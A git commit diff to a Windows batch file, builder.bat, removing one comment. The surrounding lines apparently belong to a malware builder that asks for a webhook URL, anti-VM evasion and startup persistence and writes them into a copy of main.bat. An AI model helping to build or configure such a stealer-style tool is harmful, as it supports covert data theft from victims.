320d5a41f5d02244be0d6b60a7741cc1416535ac
Fogma <140769646+FogmaLOL@users.noreply.github.com>
2023-08-07 18:24:49 +0200

    Update builder.bat

--- builder.bat
+++ builder.bat
@@ -12,7 +12,6 @@ set /p "webhook=Enter your webhook URL: "
 set /p "antiVM=Do you want to enable Anti-VM? (Y/N): "
 set /p "startOnStartup=Do you want the script to start on startup? (Y/N): "
 
-rem Create the Lol.bat file with the content of main.bat and replace the options
 (for /F "usebackq delims=" %%G in ("main.bat") do (
     set "line=%%G"
     set "line=!line:UR WEBHOOK=%webhook%!"
